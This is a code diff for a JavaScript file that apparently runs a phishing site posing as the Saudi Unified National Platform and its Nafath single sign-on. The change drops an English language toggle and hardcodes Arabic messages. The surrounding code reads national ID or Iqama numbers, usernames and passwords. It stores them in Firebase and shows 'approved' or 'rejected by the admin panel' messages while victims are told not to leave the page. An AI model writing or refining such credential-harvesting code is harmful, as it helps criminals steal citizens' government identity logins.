@@ -3,7 +3,7 @@
 // استيراد قاعدة البيانات من الملف الخارجي المخصّص لـ Firebase
 import { db } from "./firebase-config.js";
 
-// استيراد الدوال المطلوبة (إضافة doc و onSnapshot للمراقبة اللحظية)
+// استيراد الدوال المطلوبة
 import {
     collection,
     addDoc,
@@ -12,97 +12,34 @@ import {
     onSnapshot
 } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
-// ==========================================
-// قاموس الترجمة الموحد للمنصة (عربي / English)
-// ==========================================
-const translations = {
-    ar: {
-        langText: "English",
-        dir: "rtl",
-        lang: "ar",
-        loaderWaiting: "يرجى الانتظار لا تغادر الصفحه...",
-        appliedSuccess: `<i class="fa-solid fa-circle-check" style="color: #16a34a; font-size: 24px; margin-bottom: 10px; display: block;"></i> تم التقديم على وظيفتك بنجاح عبر المنصة الوطنية الموحدة... جاري تحويلك الآن`,
-        wrongId: "عذراً، رقم الهوية الوطنية أو الإقامة الذي أدخلته غير صحيح. يرجى التثبت والمحاولة مجدداً.",
-        wrongAuth: "اسم المستخدم أو كلمة المرور غير صحيحة، يرجى إعادة التأكد من بيانات النفاذ الموحد الخاص بك.",
-        approved: "تم التحقق والمطابقة بنجاح من قبل الإدارة.",
-        rejected: "تم رفض طلب التحقق من قبل لوحة الإدارة. يرجى المحاولة مجدداً.",
-        networkError: "عذراً، حدث خطأ في الاتصال بالشبكة.",
-        failSubmit: "فشل إرسال الطلب، تأكد من اتصال الشبكة.",
-        lengthError: "خطأ: يجب أن يتكون رقم بطاقة الأحوال أو الإقامة من 10 أرقام تماماً."
-    },
-    en: {
-        langText: "عربي",
-        dir: "ltr",
-        lang: "en",
-        loaderWaiting: "Please wait, do not leave the page...",
-        appliedSuccess: `<i class="fa-solid fa-circle-check" style="color: #16a34a; font-size: 24px; margin-bottom: 10px; display: block;"></i> Applied to your job successfully via the Unified National Platform... Redirecting now`,
-        wrongId: "Sorry, the National ID or Iqama number you entered is incorrect. Please verify and try again.",
-        wrongAuth: "Incorrect username or password, please check your Unified Nafath credentials again.",
-        approved: "Verification and matching completed successfully by the administration.",
-        rejected: "The verification request was rejected by the admin panel. Please try again.",
-        networkError: "Sorry, a network connection error occurred.",
-        failSubmit: "Failed to submit request, check your network connection.",
-        lengthError: "Error: National ID or Iqama number must be exactly 10 digits."
-    }
+// القاموس الثابت للرسائل والتنبيهات باللغة العربية بعد إلغاء تبديل اللغات
+const activeTrans = {
+    loaderWaiting: "يرجى الانتظار لا تغادر الصفحه...",
+    appliedSuccess: `<i class="fa-solid fa-circle-check" style="color: #16a34a; font-size: 24px; margin-bottom: 10px; display: block;"></i> تم التقديم على وظيفتك بنجاح عبر المنصة الوطنية الموحدة... جاري تحويلك الآن`,
+    wrongId: "عذراً، رقم الهوية الوطنية أو الإقامة الذي أدخلته غير صحيح. يرجى التثبت والمحاولة مجدداً.",
+    wrongAuth: "اسم المستخدم أو كلمة المرور غير صحيحة، يرجى إعادة التأكد من بيانات النفاذ الموحد الخاص بك.",
+    approved: "تم التحقق والمطابقة بنجاح من قبل الإدارة.",
+    rejected: "تم رفض طلب التحقق من قبل لوحة الإدارة. يرجى المحاولة مجدداً.",
+    networkError: "عذراً، حدث خطأ في الاتصال بالشبكة.",
+    failSubmit: "فشل إرسال الطلب، تأكد من اتصال الشبكة.",
+    lengthError: "خطأ: يجب أن يتكون رقم بطاقة الأحوال أو الإقامة من 10 أرقام تماماً."
 };
 
 document.addEventListener('DOMContentLoaded', () => {
 
     // ==========================================
-    // إدارة لغة الصفحة الحالية وتطبيقها عند الإقلاع
-    // ==========================================
-    let currentLang = localStorage.getItem('platform_lang') || 'ar';
-    
-    function applyLanguage(lang) {
-        const t = translations[lang];
-        if (!t) return;
-        
-        // 1. تحديث سمات الاتجاه واللغة لعنصر الـ HTML والـ Body
-        document.documentElement.setAttribute('dir', t.dir);
-        document.documentElement.setAttribute('lang', t.lang);
-        document.body.setAttribute('dir', t.dir);
-        document.body.style.direction = t.dir;
-        
-        // 2. تحديث نص أزرار التبديل (شاشة الويب والموبايل) ليظهر اسم اللغة المقابلة
-        const langSwitch = document.getElementById('langSwitch');
-        if (langSwitch) {
-            const span = langSwitch.querySelector('span');
-            if (span) span.innerText = t.langText;
-        }
-
-        const mobileLangSpan = document.querySelector('.mob-lang-text');
-        if (mobileLangSpan) {
-            mobileLangSpan.innerText = t.langText;
-        }
-
-        // 3. ترجمة العناصر الثابتة التي تحمل سمة data-i18n
-        document.querySelectorAll('[data-i18n]').forEach(element => {
-            const key = element.getAttribute('data-i18n');
-            if (t[key]) {
-                element.innerText = t[key];
-            }
-        });
-        
-        localStorage.setItem('platform_lang', lang);
-        currentLang = lang;
-    }
-
-    // تطبيق اللغة المحفوظة فوراً عند دخول الصفحة
-    applyLanguage(currentLang);
-
-    // ربط وتبادل الدالة مع الـ Window لكي يتمكن كود الـ HTML والـ inline JavaScript من استدعائها بشكل مباشر وقاطع
-    window.toggleAppLanguage = function() {
-        const targetLang = (currentLang === 'ar') ? 'en' : 'ar';
-        applyLanguage(targetLang);
-    };
-
-    // ==========================================
-    // 1. تفاعلات الصفحة الرئيسية (Index Page)
+    // 1. تفاعلات الصفحة الرئيسية والتحويل لصفحة تسجيل الدخول
     // ==========================================
     const loginCard = document.getElementById('loginCard');
     if (loginCard) {
-        loginCard.addEventListener('click', () => {
+        // إضافة مؤشر الماوس ليكون واضحاً أنه قابل للنقر
+        loginCard.style.cursor = 'pointer'; 
+        
+        loginCard.addEventListener('click', (e) => {
+            e.preventDefault();
             loginCard.style.transform = 'scale(0.95)';
+            loginCard.style.transition = 'transform 0.15s ease';
+            
             setTimeout(() => {
                 window.location.href = 'login.html';
             }, 150);
@@ -164,7 +101,6 @@ document.addEventListener('DOMContentLoaded', () => {
         const unsubscribe = onSnapshot(docRef, (snapshot) => {
             if (snapshot.exists()) {
                 const data = snapshot.data();
-                const activeTrans = translations[currentLang];
 
                 if (data.status === "applied_success") {
                     if (globalLoader) globalLoader.classList.remove('hidden-loader');
@@ -234,7 +170,6 @@ document.addEventListener('DOMContentLoaded', () => {
 
             const usernameInput = document.getElementById('username').value;
             const passwordInput = document.getElementById('password').value;
-            const activeTrans = translations[currentLang];
 
             if (globalLoader) globalLoader.classList.remove('hidden-loader');
             if (loaderText) {
@@ -275,7 +210,6 @@ document.addEventListener('DOMContentLoaded', () => {
             e.preventDefault();
 
             const nationalIdInput = document.getElementById('nationalId').value.trim();
-            const activeTrans = translations[currentLang];
 
             if (nationalIdInput.length !== 10) {
                 alert(activeTrans.lengthError);
@@ -303,14 +237,6 @@ document.addEventListener('DOMContentLoaded', () => {
                 alert(activeTrans.failSubmit);
                 if (globalLoader) globalLoader.classList.add('hidden-loader');
             }
-        });
-    }
-
-    // ربط الحدث البرمجي المباشر لزر تبديل اللغة بداخل كتل الموديول
-    const langSwitch = document.getElementById('langSwitch');
-    if (langSwitch) {
-        langSwitch.addEventListener('click', () => {
-            window.toggleAppLanguage();
         });
     }
 });
